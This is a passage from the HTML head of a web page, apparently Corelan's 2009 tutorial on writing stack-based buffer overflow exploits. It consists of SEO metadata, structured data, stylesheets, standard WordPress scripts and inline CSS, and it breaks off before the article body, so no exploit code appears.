<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#" class="pum-open pum-open-overlay-disabled pum-open-scrollable"><head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<title>Exploit writing tutorial part 1 : Stack Based Overflows | Corelan Cybersecurity ResearchCorelan Cybersecurity Research</title>
<link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.css" type="text/css" media="screen">
<!--[if IE 6]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie6.css" type="text/css" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie7.css" type="text/css" media="screen" /><![endif]-->
<link rel="pingback" href="https://www.corelan.be/xmlrpc.php">

		<!-- All in One SEO 4.6.4 - aioseo.com -->
		<meta name="description" content="Last friday (july 17th 2009), somebody (nick)named ‘Crazy_Hacker’ has reported a vulnerability in Easy RM to MP3 Conversion Utility (on XP SP2 En), via packetstormsecurity.org. (see http://packetstormsecurity.org/0907-exploits/). The vulnerability report included a proof of concept exploit (which, by the way, failed to work on my MS Virtual PC based XP SP3 En). Another exploit was">
		<meta name="robots" content="max-image-preview:large">
		<meta name="keywords" content="41414141,buffer,buffer overflow,buffersize,bytes,discover,ebp,eip,esp,exploit,exploit laboratory,exploit writing tutorial,hack,learn,metasploit,nop,nop sled,nop slide,overflow,pattern_create,pattern_offset,pop,push,register,saumil shah,shellcode,sk chong,stack,stack overflow,write,001_security,exploit writing tutorials,exploits">
		<link rel="canonical" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">
		<meta name="generator" content="All in One SEO (AIOSEO) 4.6.4">
		<meta property="og:locale" content="en_US">
		<meta property="og:site_name" content="Corelan Team">
		<meta property="og:type" content="article">
		<meta property="og:title" content="Exploit writing tutorial part 1 : Stack Based Overflows | Corelan Cybersecurity Research">
		<meta property="og:description" content="Last friday (july 17th 2009), somebody (nick)named ‘Crazy_Hacker’ has reported a vulnerability in Easy RM to MP3 Conversion Utility (on XP SP2 En), via packetstormsecurity.org. (see http://packetstormsecurity.org/0907-exploits/). The vulnerability report included a proof of concept exploit (which, by the way, failed to work on my MS Virtual PC based XP SP3 En). Another exploit was">
		<meta property="og:url" content="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">
		<meta property="og:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta property="og:image:secure_url" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta property="og:image:width" content="300">
		<meta property="og:image:height" content="294">
		<meta property="article:published_time" content="2009-07-19T06:55:19+00:00">
		<meta property="article:modified_time" content="2021-01-12T06:18:11+00:00">
		<meta property="article:publisher" content="https://www.facebook.com/corelanconsulting">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:site" content="@corelanconsult">
		<meta name="twitter:title" content="Exploit writing tutorial part 1 : Stack Based Overflows | Corelan Cybersecurity Research">
		<meta name="twitter:description" content="Last friday (july 17th 2009), somebody (nick)named ‘Crazy_Hacker’ has reported a vulnerability in Easy RM to MP3 Conversion Utility (on XP SP2 En), via packetstormsecurity.org. (see http://packetstormsecurity.org/0907-exploits/). The vulnerability report included a proof of concept exploit (which, by the way, failed to work on my MS Virtual PC based XP SP3 En). Another exploit was">
		<meta name="twitter:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
		<meta name="google" content="nositelinkssearchbox">
		<script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202406110101/reactive_library_fy2021.js"></script><script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202406110101/show_ads_impl_with_ama_fy2021.js?client=ca-pub-8134501503628637&amp;plah=www.corelan.be&amp;aplac=true"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#article","name":"Exploit writing tutorial part 1 : Stack Based Overflows | Corelan Cybersecurity Research","headline":"Exploit writing tutorial part 1 : Stack Based Overflows","author":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"publisher":{"@id":"https:\/\/www.corelan.be\/#organization"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2009\/07\/image_thumb4.png","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#articleImage"},"datePublished":"2009-07-19T08:55:19+02:00","dateModified":"2021-01-12T07:18:11+01:00","inLanguage":"en-US","commentCount":100,"mainEntityOfPage":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#webpage"},"isPartOf":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#webpage"},"articleSection":"001_Security, Exploit Writing Tutorials, Exploits, 41414141, buffer, buffer overflow, buffersize, bytes, discover, ebp, eip, esp, exploit, exploit laboratory, exploit writing tutorial, hack, learn, metasploit, nop, nop sled, nop slide, overflow, pattern_create, pattern_offset, pop, push, register, saumil shah, shellcode, sk chong, stack, stack overflow, write"},{"@type":"BreadcrumbList","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/#listItem","position":1,"name":"Home","item":"https:\/\/www.corelan.be\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem","position":2,"name":"2009","item":"https:\/\/www.corelan.be\/index.php\/2009\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem","previousItem":"https:\/\/www.corelan.be\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem","position":3,"name":"July","item":"https:\/\/www.corelan.be\/index.php\/2009\/07\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/#listItem","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/#listItem","position":4,"name":"19","item":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/","nextItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#listItem","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/#listItem"},{"@type":"ListItem","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#listItem","position":5,"name":"Exploit writing tutorial part 1 : Stack Based Overflows","previousItem":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/#listItem"}]},{"@type":"Organization","@id":"https:\/\/www.corelan.be\/#organization","name":"Corelan Consulting","description":":: Knowledge is not an object, it's a flow ::","url":"https:\/\/www.corelan.be\/","telephone":"+32477681000","logo":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2018\/06\/corelan-gcv-small.jpg","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#organizationLogo"},"image":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#organizationLogo"},"sameAs":["https:\/\/www.instagram.com\/corelanconsulting","https:\/\/www.linkedin.com\/company\/corelanconsulting"]},{"@type":"Person","@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author","url":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/","name":"Peter Van Eeckhoutte (corelanc0d3r)","image":{"@type":"ImageObject","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/c974115f14c4626034731347d72cf10f?s=96&d=mm&r=x","width":96,"height":96,"caption":"Peter Van Eeckhoutte (corelanc0d3r)"}},{"@type":"WebPage","@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#webpage","url":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/","name":"Exploit writing tutorial part 1 : Stack Based Overflows | Corelan Cybersecurity Research","description":"Last friday (july 17th 2009), somebody (nick)named \u2018Crazy_Hacker\u2019 has reported a vulnerability in Easy RM to MP3 Conversion Utility (on XP SP2 En), via packetstormsecurity.org. (see http:\/\/packetstormsecurity.org\/0907-exploits\/). The vulnerability report included a proof of concept exploit (which, by the way, failed to work on my MS Virtual PC based XP SP3 En). Another exploit was","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/www.corelan.be\/#website"},"breadcrumb":{"@id":"https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/#breadcrumblist"},"author":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"creator":{"@id":"https:\/\/www.corelan.be\/index.php\/author\/admin1\/#author"},"datePublished":"2009-07-19T08:55:19+02:00","dateModified":"2021-01-12T07:18:11+01:00"},{"@type":"WebSite","@id":"https:\/\/www.corelan.be\/#website","url":"https:\/\/www.corelan.be\/","name":"Corelan Cybersecurity Research","description":":: Knowledge is not an object, it's a flow ::","inLanguage":"en-US","publisher":{"@id":"https:\/\/www.corelan.be\/#organization"}}]}
		</script>
		<!-- All in One SEO -->

<link rel="dns-prefetch" href="//stats.wp.com">
<link rel="dns-prefetch" href="//jetpack.wordpress.com">
<link rel="dns-prefetch" href="//s0.wp.com">
<link rel="dns-prefetch" href="//public-api.wordpress.com">
<link rel="dns-prefetch" href="//0.gravatar.com">
<link rel="dns-prefetch" href="//1.gravatar.com">
<link rel="dns-prefetch" href="//2.gravatar.com">
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link rel="dns-prefetch" href="//pagead2.googlesyndication.com">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Feed" href="https://www.corelan.be/index.php/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Comments Feed" href="https://www.corelan.be/index.php/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Corelan Cybersecurity Research » Exploit writing tutorial part 1 : Stack Based Overflows Comments Feed" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/feed/">
		<!-- This site uses the Google Analytics by MonsterInsights plugin v8.27.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
		<!-- Note: MonsterInsights is not currently configured on this site. The site owner needs to authenticate with Google Analytics in the MonsterInsights settings panel. -->
					<!-- No tracking code set -->
				<!-- / Google Analytics by MonsterInsights -->
		<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.corelan.be\/wp-includes\/js\/wp-emoji-release.min.js?ver=81f1e4891736f11093e8f14f84539862"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://www.corelan.be/wp-includes/css/dist/block-library/style.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="https://www.corelan.be/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="https://www.corelan.be/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="cptch_stylesheet-css" href="https://www.corelan.be/wp-content/plugins/captcha/css/front_end_style.css?ver=4.4.5" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="https://www.corelan.be/wp-includes/css/dashicons.min.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<link rel="stylesheet" id="cptch_desktop_style-css" href="https://www.corelan.be/wp-content/plugins/captcha/css/desktop_style.css?ver=4.4.5" type="text/css" media="all">
<link rel="stylesheet" id="wp-downloadmanager-css" href="https://www.corelan.be/wp-content/plugins/wp-downloadmanager/download-css.css?ver=1.68.8" type="text/css" media="all">
<link rel="stylesheet" id="wpel-style-css" href="https://www.corelan.be/wp-content/plugins/wp-external-links/public/css/wpel.css?ver=2.60" type="text/css" media="all">
<link rel="stylesheet" id="wp-pagenavi-css" href="https://www.corelan.be/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70" type="text/css" media="all">
<link rel="stylesheet" id="thickbox-css" href="https://www.corelan.be/wp-includes/js/thickbox/thickbox.css?ver=81f1e4891736f11093e8f14f84539862" type="text/css" media="all">
<link rel="stylesheet" id="auto-thickbox-css" href="https://www.corelan.be/wp-content/plugins/auto-thickbox/css/styles-pre39.css?ver=20140420" type="text/css" media="all">
<link rel="stylesheet" id="yarpp-thumbnails-css" href="https://www.corelan.be/wp-content/plugins/yet-another-related-posts-plugin/style/styles_thumbnails.css?ver=5.30.10" type="text/css" media="all">
<style id="yarpp-thumbnails-inline-css" type="text/css">
.yarpp-thumbnails-horizontal .yarpp-thumbnail {width: 130px;height: 170px;margin: 5px;margin-left: 0px;}.yarpp-thumbnail > img, .yarpp-thumbnail-default {width: 120px;height: 120px;margin: 5px;}.yarpp-thumbnails-horizontal .yarpp-thumbnail-title {margin: 7px;margin-top: 0px;width: 120px;}.yarpp-thumbnail-default > img {min-height: 120px;min-width: 120px;}
</style>
<link rel="stylesheet" id="popup-maker-site-css" href="//www.corelan.be/wp-content/uploads/33a0700595809ce19c4dce1ddabf5e24.css?generated=1716470310&amp;ver=1.19.0" type="text/css" media="all">
<link rel="stylesheet" id="moove_gdpr_frontend-css" href="https://www.corelan.be/wp-content/plugins/gdpr-cookie-compliance/dist/styles/gdpr-main.css?ver=4.15.1" type="text/css" media="all">
<style id="moove_gdpr_frontend-inline-css" type="text/css">
#moove_gdpr_cookie_modal,#moove_gdpr_cookie_info_bar,.gdpr_cookie_settings_shortcode_content{font-family:Nunito,sans-serif}#moove_gdpr_save_popup_settings_button{background-color:#373737;color:#fff}#moove_gdpr_save_popup_settings_button:hover{background-color:#000}#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton,#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton{background-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green{background-color:#0c4da2;border-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton:hover,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green:hover{background-color:#fff;color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close span.gdpr-icon{background-color:#0c4da2;border:1px solid #0c4da2}#moove_gdpr_cookie_info_bar span.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar span.change-settings-button:focus,#moove_gdpr_cookie_info_bar button.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar button.change-settings-button:focus{-webkit-box-shadow:0 0 1px 3px #0c4da2;-moz-box-shadow:0 0 1px 3px #0c4da2;box-shadow:0 0 1px 3px #0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content 